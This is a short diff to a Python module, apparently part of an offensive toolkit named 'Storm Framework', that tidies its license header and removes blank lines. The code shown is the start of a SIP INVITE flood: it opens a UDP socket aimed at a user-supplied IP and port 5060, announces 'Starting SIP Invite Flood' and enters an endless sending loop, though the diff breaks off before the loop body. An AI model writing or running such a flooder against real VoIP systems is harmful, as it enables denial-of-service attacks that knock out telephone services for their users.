@@ -1,24 +1,18 @@
+# MIT License.
 # Copyright (c) 2026 Storm Framework
 
-# Licensed under the MIT License.
+# See LICENSE file in the project root for full license information.
 
-See LICENSE file in the project root for full license information.
 
 import socket
 import random
-
 REQUIRED_OPTIONS = {"IP": "", "PORT": "standar port 5060"}
-
-
 def execute(options):
     ip = options.get("IP")
     port = int(options.get("PORT"))
-
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
     print(f"[*] Starting SIP Invite Flood on {ip}:{port}")
     print("[*] Press Ctrl+C to stop the attack.")
-
     count = 0
     try:
         while True:
